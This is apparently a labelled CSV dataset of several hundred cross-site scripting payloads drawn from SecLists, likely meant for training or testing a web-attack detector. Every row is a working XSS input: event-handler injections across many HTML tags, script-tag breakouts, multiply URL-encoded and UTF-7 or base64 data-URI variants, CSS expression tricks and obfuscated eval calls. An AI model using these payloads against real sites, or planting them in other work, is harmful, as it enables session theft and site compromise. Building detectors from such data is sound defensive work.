payload,label,source
"<tt oncopy=""alert(1)"" contenteditable>test</tt>",xss,seclists
"<tt oncut=""alert(1)"" contenteditable>test</tt>",xss,seclists
"<tt ondblclick=""alert(1)"">test</tt>",xss,seclists
<tt onfocusout=alert(1) tabindex=1 id=x></tt><input autofocus>,xss,seclists
"<tt onkeydown=""alert(1)"" contenteditable>test</tt>",xss,seclists
"<tt onkeypress=""alert(1)"" contenteditable>test</tt>",xss,seclists
"<tt onkeyup=""alert(1)"" contenteditable>test</tt>",xss,seclists
"<tt onmousedown=""alert(1)"">test</tt>",xss,seclists
"<tt onmouseenter=""alert(1)"">test</tt>",xss,seclists
"<tt onmouseleave=""alert(1)"">test</tt>",xss,seclists
"<tt onmousemove=""alert(1)"">test</tt>",xss,seclists
"<tt onmouseout=""alert(1)"">test</tt>",xss,seclists
"<tt onmouseover=""alert(1)"">test</tt>",xss,seclists
"<tt onmouseup=""alert(1)"">test</tt>",xss,seclists
"<tt onpaste=""alert(1)"" contenteditable>test</tt>",xss,seclists
"<u draggable=""true"" ondrag=""alert(1)"">test</u>",xss,seclists
"<u draggable=""true"" ondragend=""alert(1)"">test</u>",xss,seclists
"<u draggable=""true"" ondragenter=""alert(1)"">test</u>",xss,seclists
"<u draggable=""true"" ondragleave=""alert(1)"">test</u>",xss,seclists
"<u draggable=""true"" ondragstart=""alert(1)"">test</u>",xss,seclists
<u id=x tabindex=1 onactivate=alert(1)></u>,xss,seclists
<u id=x tabindex=1 onbeforeactivate=alert(1)></u>,xss,seclists
<u id=x tabindex=1 onbeforedeactivate=alert(1)></u><input autofocus>,xss,seclists
<u id=x tabindex=1 ondeactivate=alert(1)></u><input id=y autofocus>,xss,seclists
<u id=x tabindex=1 onfocus=alert(1)></u>,xss,seclists
<u id=x tabindex=1 onfocusin=alert(1)></u>,xss,seclists
"<u onbeforecopy=""alert(1)"" contenteditable>test</u>",xss,seclists
"<u onbeforecut=""alert(1)"" contenteditable>test</u>",xss,seclists
"<u onbeforepaste=""alert(1)"" contenteditable>test</u>",xss,seclists
<u onblur=alert(1) tabindex=1 id=x></u><input autofocus>,xss,seclists
"<u onclick=""alert(1)"">test</u>",xss,seclists
"<u oncontextmenu=""alert(1)"">test</u>",xss,seclists
"<u oncopy=""alert(1)"" contenteditable>test</u>",xss,seclists
"<u oncut=""alert(1)"" contenteditable>test</u>",xss,seclists
"<u ondblclick=""alert(1)"">test</u>",xss,seclists
<u onfocusout=alert(1) tabindex=1 id=x></u><input autofocus>,xss,seclists
"<u onkeydown=""alert(1)"" contenteditable>test</u>",xss,seclists
"<u onkeypress=""alert(1)"" contenteditable>test</u>",xss,seclists
"<u onkeyup=""alert(1)"" contenteditable>test</u>",xss,seclists
"<u onmousedown=""alert(1)"">test</u>",xss,seclists
"<u onmouseenter=""alert(1)"">test</u>",xss,seclists
"<u onmouseleave=""alert(1)"">test</u>",xss,seclists
"<u onmousemove=""alert(1)"">test</u>",xss,seclists
"<u onmouseout=""alert(1)"">test</u>",xss,seclists
"<u onmouseover=""alert(1)"">test</u>",xss,seclists
"<u onmouseup=""alert(1)"">test</u>",xss,seclists
"<u onpaste=""alert(1)"" contenteditable>test</u>",xss,seclists
"<ul draggable=""true"" ondrag=""alert(1)"">test</ul>",xss,seclists
"<ul draggable=""true"" ondragend=""alert(1)"">test</ul>",xss,seclists
"<ul draggable=""true"" ondragenter=""alert(1)"">test</ul>",xss,seclists
"<ul draggable=""true"" ondragleave=""alert(1)"">test</ul>",xss,seclists
"<ul draggable=""true"" ondragstart=""alert(1)"">test</ul>",xss,seclists
<ul id=x tabindex=1 onactivate=alert(1)></ul>,xss,seclists
<ul id=x tabindex=1 onbeforeactivate=alert(1)></ul>,xss,seclists
<ul id=x tabindex=1 onbeforedeactivate=alert(1)></ul><input autofocus>,xss,seclists
<ul id=x tabindex=1 ondeactivate=alert(1)></ul><input id=y autofocus>,xss,seclists
<ul id=x tabindex=1 onfocus=alert(1)></ul>,xss,seclists
<ul id=x tabindex=1 onfocusin=alert(1)></ul>,xss,seclists
"<ul onbeforecopy=""alert(1)"" contenteditable>test</ul>",xss,seclists
"<ul onbeforecut=""alert(1)"" contenteditable>test</ul>",xss,seclists
"<ul onbeforepaste=""alert(1)"" contenteditable>test</ul>",xss,seclists
<ul onblur=alert(1) tabindex=1 id=x></ul><input autofocus>,xss,seclists
"<ul onclick=""alert(1)"">test</ul>",xss,seclists
"<ul oncontextmenu=""alert(1)"">test</ul>",xss,seclists
"<ul oncopy=""alert(1)"" contenteditable>test</ul>",xss,seclists
"<ul oncut=""alert(1)"" contenteditable>test</ul>",xss,seclists
"<ul ondblclick=""alert(1)"">test</ul>",xss,seclists
<ul onfocusout=alert(1) tabindex=1 id=x></ul><input autofocus>,xss,seclists
"<ul onkeydown=""alert(1)"" contenteditable>test</ul>",xss,seclists
"<ul onkeypress=""alert(1)"" contenteditable>test</ul>",xss,seclists
"<ul onkeyup=""alert(1)"" contenteditable>test</ul>",xss,seclists
"<ul onmousedown=""alert(1)"">test</ul>",xss,seclists
"<ul onmouseenter=""alert(1)"">test</ul>",xss,seclists
"<ul onmouseleave=""alert(1)"">test</ul>",xss,seclists
"<ul onmousemove=""alert(1)"">test</ul>",xss,seclists
"<ul onmouseout=""alert(1)"">test</ul>",xss,seclists
"<ul onmouseover=""alert(1)"">test</ul>",xss,seclists
"<ul onmouseup=""alert(1)"">test</ul>",xss,seclists
"<ul onpaste=""alert(1)"" contenteditable>test</ul>",xss,seclists
"<var draggable=""true"" ondrag=""alert(1)"">test</var>",xss,seclists
"<var draggable=""true"" ondragend=""alert(1)"">test</var>",xss,seclists
"<var draggable=""true"" ondragenter=""alert(1)"">test</var>",xss,seclists
"<var draggable=""true"" ondragleave=""alert(1)"">test</var>",xss,seclists
"<var draggable=""true"" ondragstart=""alert(1)"">test</var>",xss,seclists
<var id=x tabindex=1 onactivate=alert(1)></var>,xss,seclists
<var id=x tabindex=1 onbeforeactivate=alert(1)></var>,xss,seclists
<var id=x tabindex=1 onbeforedeactivate=alert(1)></var><input autofocus>,xss,seclists
<var id=x tabindex=1 ondeactivate=alert(1)></var><input id=y autofocus>,xss,seclists
<var id=x tabindex=1 onfocus=alert(1)></var>,xss,seclists
<var id=x tabindex=1 onfocusin=alert(1)></var>,xss,seclists
"<var onbeforecopy=""alert(1)"" contenteditable>test</var>",xss,seclists
"<var onbeforecut=""alert(1)"" contenteditable>test</var>",xss,seclists
"<var onbeforepaste=""alert(1)"" contenteditable>test</var>",xss,seclists
<var onblur=alert(1) tabindex=1 id=x></var><input autofocus>,xss,seclists
"<var onclick=""alert(1)"">test</var>",xss,seclists
"<var oncontextmenu=""alert(1)"">test</var>",xss,seclists
"<var oncopy=""alert(1)"" contenteditable>test</var>",xss,seclists
"<var oncut=""alert(1)"" contenteditable>test</var>",xss,seclists
"<var ondblclick=""alert(1)"">test</var>",xss,seclists
<var onfocusout=alert(1) tabindex=1 id=x></var><input autofocus>,xss,seclists
"<var onkeydown=""alert(1)"" contenteditable>test</var>",xss,seclists
"<var onkeypress=""alert(1)"" contenteditable>test</var>",xss,seclists
"<var onkeyup=""alert(1)"" contenteditable>test</var>",xss,seclists
"<var onmousedown=""alert(1)"">test</var>",xss,seclists
"<var onmouseenter=""alert(1)"">test</var>",xss,seclists
"<var onmouseleave=""alert(1)"">test</var>",xss,seclists
"<var onmousemove=""alert(1)"">test</var>",xss,seclists
"<var onmouseout=""alert(1)"">test</var>",xss,seclists
"<var onmouseover=""alert(1)"">test</var>",xss,seclists
"<var onmouseup=""alert(1)"">test</var>",xss,seclists
"<var onpaste=""alert(1)"" contenteditable>test</var>",xss,seclists
"<video autoplay controls onpause=alert(1)><source src=""validvideo.mp4"" type=""video/mp4""></video>",xss,seclists
"<video autoplay controls onseeked=alert(1)><source src=""validvideo.mp4"" type=""video/mp4""></video>",xss,seclists
"<video autoplay controls onseeking=alert(1)><source src=""validvideo.mp4"" type=""video/mp4""></video>",xss,seclists
"<video autoplay controls onvolumechange=alert(1)><source src=""validvideo.mp4"" type=""video/mp4""></video>",xss,seclists
"<video autoplay controls onwaiting=alert(1)><source src=""validvideo.mp4"" type=video/mp4></video>",xss,seclists
"<video autoplay onloadedmetadata=alert(1)> <source src=""validvideo.mp4"" type=""video/mp4""></video>",xss,seclists
"<video autoplay onplay=alert(1)><source src=""validvideo.mp4"" type=""video/mp4""></video>",xss,seclists
"<video autoplay onplaying=alert(1)><source src=""validvideo.mp4"" type=""video/mp4""></video>",xss,seclists
"<video controls autoplay onended=alert(1)><source src=""validvideo.mp4"" type=""video/mp4""></video>",xss,seclists
"<video controls autoplay ontimeupdate=alert(1)><source src=""validvideo.mp4"" type=""video/mp4""></video>",xss,seclists
"<video draggable=""true"" ondrag=""alert(1)"">test</video>",xss,seclists
"<video draggable=""true"" ondragend=""alert(1)"">test</video>",xss,seclists
"<video draggable=""true"" ondragenter=""alert(1)"">test</video>",xss,seclists
"<video draggable=""true"" ondragleave=""alert(1)"">test</video>",xss,seclists
"<video draggable=""true"" ondragstart=""alert(1)"">test</video>",xss,seclists
"<video id=x controls onfocus=alert(1)><source src=""validvideo.mp4"" type=video/mp4></video>",xss,seclists
"<video id=x controls onfocusin=alert(1)><source src=""validvideo.mp4"" type=video/mp4></video>",xss,seclists
<video id=x tabindex=1 onactivate=alert(1)></video>,xss,seclists
<video id=x tabindex=1 onbeforeactivate=alert(1)></video>,xss,seclists
<video id=x tabindex=1 onbeforedeactivate=alert(1)></video><input autofocus>,xss,seclists
<video id=x tabindex=1 ondeactivate=alert(1)></video><input id=y autofocus>,xss,seclists
"<video onbeforecopy=""alert(1)"" contenteditable>test</video>",xss,seclists
"<video onbeforecut=""alert(1)"" contenteditable>test</video>",xss,seclists
"<video onbeforepaste=""alert(1)"" contenteditable>test</video>",xss,seclists
<video onblur=alert(1) tabindex=1 id=x></video><input autofocus>,xss,seclists
"<video oncanplay=alert(1)><source src=""validvideo.mp4"" type=""video/mp4""></video>",xss,seclists
"<video oncanplaythrough=alert(1)><source src=""validvideo.mp4"" type=""video/mp4""></video>",xss,seclists
"<video onclick=""alert(1)"">test</video>",xss,seclists
"<video oncontextmenu=""alert(1)"">test</video>",xss,seclists
"<video oncopy=""alert(1)"" contenteditable>test</video>",xss,seclists
"<video oncut=""alert(1)"" contenteditable>test</video>",xss,seclists
"<video ondblclick=""alert(1)"">test</video>",xss,seclists
<video onfocusout=alert(1) tabindex=1 id=x></video><input autofocus>,xss,seclists
"<video onkeydown=""alert(1)"" contenteditable>test</video>",xss,seclists
"<video onkeypress=""alert(1)"" contenteditable>test</video>",xss,seclists
"<video onkeyup=""alert(1)"" contenteditable>test</video>",xss,seclists
"<video onloadeddata=alert(1)><source src=""validvideo.mp4"" type=""video/mp4""></video>",xss,seclists
"<video onmousedown=""alert(1)"">test</video>",xss,seclists
"<video onmouseenter=""alert(1)"">test</video>",xss,seclists
"<video onmouseleave=""alert(1)"">test</video>",xss,seclists
"<video onmousemove=""alert(1)"">test</video>",xss,seclists
"<video onmouseout=""alert(1)"">test</video>",xss,seclists
"<video onmouseover=""alert(1)"">test</video>",xss,seclists
"<video onmouseup=""alert(1)"">test</video>",xss,seclists
"<video onpaste=""alert(1)"" contenteditable>test</video>",xss,seclists
<video src/onerror=alert(1)>,xss,seclists
<video><source onerror=alert(1) src=1></video>,xss,seclists
"<video><track default onload=alert(1) src=""data:text/vtt,WEBVTT""></video>",xss,seclists
"<wbr draggable=""true"" ondrag=""alert(1)"">test</wbr>",xss,seclists
"<wbr draggable=""true"" ondragend=""alert(1)"">test</wbr>",xss,seclists
"<wbr draggable=""true"" ondragenter=""alert(1)"">test</wbr>",xss,seclists
"<wbr draggable=""true"" ondragleave=""alert(1)"">test</wbr>",xss,seclists
"<wbr draggable=""true"" ondragstart=""alert(1)"">test</wbr>",xss,seclists
<wbr id=x tabindex=1 onactivate=alert(1)></wbr>,xss,seclists
<wbr id=x tabindex=1 onbeforeactivate=alert(1)></wbr>,xss,seclists
<wbr id=x tabindex=1 onbeforedeactivate=alert(1)></wbr><input autofocus>,xss,seclists
<wbr id=x tabindex=1 ondeactivate=alert(1)></wbr><input id=y autofocus>,xss,seclists
<wbr id=x tabindex=1 onfocus=alert(1)></wbr>,xss,seclists
<wbr id=x tabindex=1 onfocusin=alert(1)></wbr>,xss,seclists
"<wbr onbeforecopy=""alert(1)"" contenteditable>test</wbr>",xss,seclists
"<wbr onbeforecut=""alert(1)"" contenteditable>test</wbr>",xss,seclists
"<wbr onbeforepaste=""alert(1)"" contenteditable>test</wbr>",xss,seclists
<wbr onblur=alert(1) tabindex=1 id=x></wbr><input autofocus>,xss,seclists
"<wbr onclick=""alert(1)"">test</wbr>",xss,seclists
"<wbr oncontextmenu=""alert(1)"">test</wbr>",xss,seclists
"<wbr oncopy=""alert(1)"" contenteditable>test</wbr>",xss,seclists
"<wbr oncut=""alert(1)"" contenteditable>test</wbr>",xss,seclists
"<wbr ondblclick=""alert(1)"">test</wbr>",xss,seclists
<wbr onfocusout=alert(1) tabindex=1 id=x></wbr><input autofocus>,xss,seclists
"<wbr onkeydown=""alert(1)"" contenteditable>test</wbr>",xss,seclists
"<wbr onkeypress=""alert(1)"" contenteditable>test</wbr>",xss,seclists
"<wbr onkeyup=""alert(1)"" contenteditable>test</wbr>",xss,seclists
"<wbr onmousedown=""alert(1)"">test</wbr>",xss,seclists
"<wbr onmouseenter=""alert(1)"">test</wbr>",xss,seclists
"<wbr onmouseleave=""alert(1)"">test</wbr>",xss,seclists
"<wbr onmousemove=""alert(1)"">test</wbr>",xss,seclists
"<wbr onmouseout=""alert(1)"">test</wbr>",xss,seclists
"<wbr onmouseover=""alert(1)"">test</wbr>",xss,seclists
"<wbr onmouseup=""alert(1)"">test</wbr>",xss,seclists
"<wbr onpaste=""alert(1)"" contenteditable>test</wbr>",xss,seclists
"<xmp draggable=""true"" ondrag=""alert(1)"">test</xmp>",xss,seclists
"<xmp draggable=""true"" ondragend=""alert(1)"">test</xmp>",xss,seclists
"<xmp draggable=""true"" ondragenter=""alert(1)"">test</xmp>",xss,seclists
"<xmp draggable=""true"" ondragleave=""alert(1)"">test</xmp>",xss,seclists
"<xmp draggable=""true"" ondragstart=""alert(1)"">test</xmp>",xss,seclists
<xmp id=x tabindex=1 onactivate=alert(1)></xmp>,xss,seclists
<xmp id=x tabindex=1 onbeforeactivate=alert(1)></xmp>,xss,seclists
<xmp id=x tabindex=1 onbeforedeactivate=alert(1)></xmp><input autofocus>,xss,seclists
<xmp id=x tabindex=1 ondeactivate=alert(1)></xmp><input id=y autofocus>,xss,seclists
<xmp id=x tabindex=1 onfocus=alert(1)></xmp>,xss,seclists
<xmp id=x tabindex=1 onfocusin=alert(1)></xmp>,xss,seclists
"<xmp onbeforecopy=""alert(1)"" contenteditable>test</xmp>",xss,seclists
"<xmp onbeforecut=""alert(1)"" contenteditable>test</xmp>",xss,seclists
"<xmp onbeforepaste=""alert(1)"" contenteditable>test</xmp>",xss,seclists
<xmp onblur=alert(1) tabindex=1 id=x></xmp><input autofocus>,xss,seclists
"<xmp onclick=""alert(1)"">test</xmp>",xss,seclists
"<xmp oncontextmenu=""alert(1)"">test</xmp>",xss,seclists
"<xmp oncopy=""alert(1)"" contenteditable>test</xmp>",xss,seclists
"<xmp oncut=""alert(1)"" contenteditable>test</xmp>",xss,seclists
"<xmp ondblclick=""alert(1)"">test</xmp>",xss,seclists
<xmp onfocusout=alert(1) tabindex=1 id=x></xmp><input autofocus>,xss,seclists
"<xmp onkeydown=""alert(1)"" contenteditable>test</xmp>",xss,seclists
"<xmp onkeypress=""alert(1)"" contenteditable>test</xmp>",xss,seclists
"<xmp onkeyup=""alert(1)"" contenteditable>test</xmp>",xss,seclists
"<xmp onmousedown=""alert(1)"">test</xmp>",xss,seclists
"<xmp onmouseenter=""alert(1)"">test</xmp>",xss,seclists
"<xmp onmouseleave=""alert(1)"">test</xmp>",xss,seclists
"<xmp onmousemove=""alert(1)"">test</xmp>",xss,seclists
"<xmp onmouseout=""alert(1)"">test</xmp>",xss,seclists
"<xmp onmouseover=""alert(1)"">test</xmp>",xss,seclists
"<xmp onmouseup=""alert(1)"">test</xmp>",xss,seclists
"<xmp onpaste=""alert(1)"" contenteditable>test</xmp>",xss,seclists
<xss id=x tabindex=1 onactivate=alert(1)></xss>,xss,seclists
<xss id=x tabindex=1 onbeforeactivate=alert(1)></xss>,xss,seclists
<xss id=x tabindex=1 onbeforedeactivate=alert(1)></xss><input autofocus>,xss,seclists
<xss id=x tabindex=1 onblur=alert(1)></xss><input autofocus>,xss,seclists
<xss id=x tabindex=1 ondeactivate=alert(1)></xss><input autofocus>,xss,seclists
<xss id=x tabindex=1 onfocus=alert(1)></xss>,xss,seclists
<xss id=x tabindex=1 onfocusin=alert(1)></xss>,xss,seclists
<xss id=x tabindex=1 onfocusout=alert(1)></xss><input autofocus>,xss,seclists
"""'`ʼˈ‘’‚‛“”„‟′″‴‵‶‷﹅﹐＂＇，舧艠︐︑--><script>alert(42)</script>",xss,seclists
"""'><script>alert('XSS')</script>",xss,seclists
"""'><script>alert(/XSS/)</script>",xss,seclists
"""'><script>alert(42)</script>",xss,seclists
"""'><script>prompt(42)</script>",xss,seclists
"""'><script>confirm(42)</script>",xss,seclists
"""'><sCriPt>confirm(42)</sCriPt>",xss,seclists
"""'><script >confirm(42)</script >",xss,seclists
"""'><script foo=bar>confirm(42)</script>",xss,seclists
"""'><\script>confirm(42)</script>",xss,seclists
"""'><sc\ript>confirm(42)</script>",xss,seclists
"""'><sc\tript>confirm(42)</script>",xss,seclists
"""'><script onlyOpera:-)>alert(42)",xss,seclists
"""'><script /*%00*/>/*%00*/alert(42)/*%00*/</script /*%00*/",xss,seclists
"""'><script x:href='//evil.com/onlyOpera'>",xss,seclists
"""'><///script///>alert(42)</script>",xss,seclists
"""'><///style///>alert(42)</script>",xss,seclists
"""'><;(24)trela=daolno ;''=e>'=d",xss,seclists
"""'><;(24)trela=daolno ;''=/e>'=d",xss,seclists
"""'><isindex action=""javas&Tab;cript:alert(42)"" type=image>",xss,seclists
"""'><sc	ript>confirm(42)</script>",xss,seclists
"""'%3e%3cscript%3econfirm(42)%3c/script%3e",xss,seclists
"""'%253e%253cscript%253econfirm(42)%253c/script%253e",xss,seclists
"""'%25253e%25253cscript%25253econfirm(42)%25253c/script%25253e",xss,seclists
"""'%u3e%u3cscript%u3econfirm(42)%u3c/script%u3e",xss,seclists
"""'%u003e%u003cscript%u003econfirm(42)%u003c/script%u003e",xss,seclists
"""'%25u003e%25u003cscript%25u003econfirm(42)%25u003c/script%25u003e",xss,seclists
%22%27%3e%3cscript%3econfirm(42)%3c/script%3e,xss,seclists
%u22%u27%u3e%u3cscript%u3econfirm(42)%u3c/script%u3e,xss,seclists
%u0022%u0027%u003e%u003cscript%u003econfirm(42)%u003c/script%u003e,xss,seclists
%2522%2527%253e%253cscript%253econfirm(42)%253c/script%253e,xss,seclists
%252522%252527%25253e%25253cscript%25253econfirm(42)%25253c/script%25253e,xss,seclists
%25u22%25u27%25u3e%25u3cscript%25u3econfirm(42)%25u3c/script%25u3e,xss,seclists
%25u0022%25u0027%25u003e%25u003cscript%25u003econfirm(42)%25u003c/script%25u003e,xss,seclists
"""'><script>\u0061lert(42)</script>",xss,seclists
"""'ܾܼscriptܾalert(42)ܼܯscriptܾ",xss,seclists
"""'%07%3e%07%3cscript%07%3ealert(42)%07%3c/script%07%3e",xss,seclists
"""'%u073e%u073cscript%u073ealert(42)%u073c/script%u073e",xss,seclists
%07%22%07%27%07%3e%07%3cscript%07%3ealert(42)%07%3c/script%07%3e,xss,seclists
%u0722%u0727%u073e%u073cscript%u073ealert(42)%u073c/script%u073e,xss,seclists
"""'%2507%253e%2507%253cscript%2507%253ealert(42)%2507%253c/script%2507%253e",xss,seclists
"""'%25u073e%25u073cscript%25u073ealert(42)%25u073c/script%25u073e",xss,seclists
%2507%2522%2507%2527%2507%253e%2507%253cscript%2507%253ealert(42)%2507%253c/script%2507%253e,xss,seclists
%25u0722%25u0727%25u073e%25u073cscript%25u073ealert(42)%25u073c/script%25u073e,xss,seclists
javascript:alert(42),xss,seclists
javascript:prompt(42),xss,seclists
javascript:confirm(42),xss,seclists
jAvasCript:confirm(42),xss,seclists
jAvas\Cript:confirm(42),xss,seclists
jAvas	Cript:confirm(42),xss,seclists
jAvas/* */Cript:confirm(42),xss,seclists
document,xss,seclists
document.,xss,seclists
top,xss,seclists
top.,xss,seclists
top[,xss,seclists
eval(,xss,seclists
cookie,xss,seclists
.cookie,xss,seclists
onerror=,xss,seclists
onclick=,xss,seclists
onmouseover=,xss,seclists
onload=,xss,seclists
"""onerror",xss,seclists
"""onerror=",xss,seclists
"""onclick",xss,seclists
"""onclick=",xss,seclists
"""onmouseover",xss,seclists
"""onmouseover=",xss,seclists
"""onload",xss,seclists
"""onload=",xss,seclists
href=,xss,seclists
src=,xss,seclists
link=,xss,seclists
style=,xss,seclists
alt=,xss,seclists
title=,xss,seclists
egal=,xss,seclists
"""href=",xss,seclists
"""src=",xss,seclists
"""link=",xss,seclists
"""style=",xss,seclists
"""alt=",xss,seclists
"""title=",xss,seclists
"""egal=",xss,seclists
<a,xss,seclists
<a href=,xss,seclists
<a alt=42 href=,xss,seclists
"<a href=""javascript:",xss,seclists
"<a href="" javascript:",xss,seclists
<p,xss,seclists
<div,xss,seclists
<iframe,xss,seclists
<index,xss,seclists
<layer,xss,seclists
<link,xss,seclists
<meta,xss,seclists
<style,xss,seclists
<script,xss,seclists
"<img src=""/"" =_="" title=""onerror='alert(42)'"">",xss,seclists
<img src ?notinChrome?\/onerror = alert(42),xss,seclists
<img src ?notinChrome?\/onerror=alert(42),xss,seclists
"<img/alt=""/""src=""/""onerror=alert(42)>",xss,seclists
<iframe/src \/\/onload = alert(42),xss,seclists
<iframe/onreadystatechange=alert(42),xss,seclists
<!-- open comment,xss,seclists
<!-- complete comment -->,xss,seclists
--><!-- close/complete comment -->,xss,seclists
<![CDATA[,xss,seclists
<![CDATA[ open cdata,xss,seclists
<![CDATA[ complete cdata ]]>,xss,seclists
]]><![CDATA[ close/complete cdata ]]>,xss,seclists
<?xml,xss,seclists
"<?xml version=""1.0"">",xss,seclists
""" value=``",xss,seclists
onmouseover=\u0061\u006C\u0065\u0072\u0074('XSS'),xss,seclists
onmouseover=\uFF41\uFF4C\uFF45\uFF52\uFF54\u1455\uFF14\uFF12\u1450,xss,seclists
"<div style=""{ left:expression( alert('XSS') ) }"">",xss,seclists
left:expr/**/ession(alert('XSS')),xss,seclists
left:expr/* */ession(alert('XSS')),xss,seclists
left:e\0078pr\0065ssion(alert('XSS')),xss,seclists
left:\0065\0078pr\0065ssion(alert('XSS')),xss,seclists
left:expr\65ssion(alert('XSS') )),xss,seclists
left:expr\0065ssion(alert('XSS')),xss,seclists
left:expr&#x65;ssion(alert('XSS')),xss,seclists
left:expr&#101;ssion(alert('XSS')),xss,seclists
left:expr&#x0065;ssion(alert('XSS')),xss,seclists
left:\ff45\ff58\ff50\ff52\ff45\ff53\ff53\ff49\ff4f\ff4e(alert('XSS')),xss,seclists
left:&#xff45;&#xff58;&#xff50;&#xff52;&#xff45;&#xff53;&#xff53;&#xff49;&#xff4f;&#xff4e;(alert('XSS')),xss,seclists
left:\uFF41\uFF4C\uFF45\uFF52\uFF54\u1455\uFF14\uFF12\u1450,xss,seclists
left:ｅｘｐｒｅｓｓｉｏｎ(alert('XSS')),xss,seclists
left:EXPR/**/ESSION(alert('XSS')),xss,seclists
left:EXPR/* */ESSION(alert('XSS')),xss,seclists
left:\ff25\ff38\ff30\ff32\ff42\ff53\ff33\ff29\ff2f\ff2e(alert('XSS')),xss,seclists
left:&#xff25;&#xff38;&#xff30;&#xff32;&#xff42;&#xff53;&#xff33;&#xff29;&#xff2f;&#xff2e;(alert('XSS')),xss,seclists
left:ＥＸＰＲＥＳＳＩＯＮ(alert('XSS')),xss,seclists
left:exp\0280essio\0274(alert('XSS')),xss,seclists
left:exp\0280essio\207f(alert('XSS')),xss,seclists
left:expʀessioɴ(alert('XSS')),xss,seclists
left:expʀessioⁿ(alert('XSS')),xss,seclists
%u00ABscript%u00BB,xss,seclists
&#x3008;script&#x3009;,xss,seclists
U%2bFF1CscriptU%2bFF1E,xss,seclists
&#x2039;script&#x203A;,xss,seclists
&#x2329;script&#x232A;,xss,seclists
&#x27E8;script&#x27E9;,xss,seclists
"href=""data:text/html;charset=utf-8,%3cscript%3econfirm(42);%3c/script%3e""	UTF-8 URL-encoded",xss,seclists
"href=""data:text/html;charset=utf-8,%3c%73%63%72%69%70%74%3e%63%6f%6e%66%69%72%6d%28%34%32%29%3b%3c%2f%73%63%72%69%70%74%3e""	UTF-8 URL-encoded (all)",xss,seclists
"href=""data:text/html;base64,PHNjcmlwdD5jb25maXJtKDQyKTs8L3NjcmlwdD4=""	base64",xss,seclists
"href=""data:text/html;charset=utf-7,+ADw-script+AD4-confirm(42)+ADsAPA-/script+AD4-""	UTF-7",xss,seclists
"href=""data:text/html;charset=utf-7,+ADwAcwBjAHIAaQBwAHQAPgBhAGwAZQByAHQAKAAxACkAOwBoAGkAcwB0AG8AcgB5AC4AYgBhAGMAawAoACkAOwA8AC8AcwBjAHIAaQBwAHQAPgAKADwAcwBjAHIAaQBwAHQAPgBjAG8AbgBmAGkAcgBtACgANAAyACkAOwA8AC8AcwBjAHIAaQBwAHQAPg-""	UTF-7 (all)",xss,seclists
"href=""data:text/html;charset=utf-7,+ADwAcwBjAHIAaQBwAHQAPg-confirm(42)+ADsAPA-/script+AD4-""	UTF-7/UTF-8 mix",xss,seclists
"href=""data:text/html;charset=utf-7;base64,K0FEdy1zY3JpcHQrQUQ0LWNvbmZpcm0oNDIpK0FEc0FQQS0vc2NyaXB0K0FENC0=""	UTF-7 in base64",xss,seclists
"href=""data:                                          text/html;charset=utf-7;base64,K0FEdy1zY3JpcHQrQUQ0LWNvbmZpcm0oNDIpK0FEc0FQQS0vc2NyaXB0K0FENC0="">obfuscated UTF-7 in base64",xss,seclists
"href=""data:text/html;base64;charset=utf-7,+AFAASABOAGoAYwBtAGwAdwBkAEQANQBqAGIAMgA1AG0AYQBYAEoAdABLAEQAUQB5AEsAVABzADgATAAzAE4AagBjAG0AbAB3AGQARAA0AD0-""	base64 in UTF-7",xss,seclists
%22onmouseover%3d'alert(/PHP_SELF/)'%3d%22%3e,xss,seclists
%20%22onmouseover%3d'alert(/PHP_SELF/)'%3d%22%3e,xss,seclists
<%<!--'%><script>alert(42);</script -->,xss,seclists
' onmouseover=alert(/XSS/),xss,seclists
: \');confirm(1);//,xss,seclists
<x/onmouSeenter=window[`\x61\x6c\x65\x72\x74`]`1337`,xss,seclists
<script>prompt(1)</script>,xss,seclists
<script>confirm(1)</script>,xss,seclists
<script>var fn=window[490837..toString(1<<5)];     fn(atob('YWxlcnQoMSk='));</script>,xss,seclists
"<script>var fn=window[String.fromCharCode(101,118,97,108)];     fn(atob('YWxlcnQoMSk='));</script>",xss,seclists
<script>var fn=window[atob('ZXZhbA==')];fn(atob('YWxlcnQoMSk='));    </script>,xss,seclists
<script>window[490837..toString(1<<5)](atob('YWxlcnQoMSk='))</script>     <script>this[490837..toString(1<<5)](atob('YWxlcnQoMSk='))</script>     <script>this[(+{}+[])[+!![]]+(![]+[])[!+[]+!![]]+([][+[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]](++[[]][+[]])</script>     <script>this[(+{}+[])[-~[]]+(![]+[])[-~-~[]]+([][+[]]+[])[-~-~-~[]]+(!![]+[])[-~[]]+(!![]+[])[+[]]]((-~[]+[]))</script>,xss,seclists
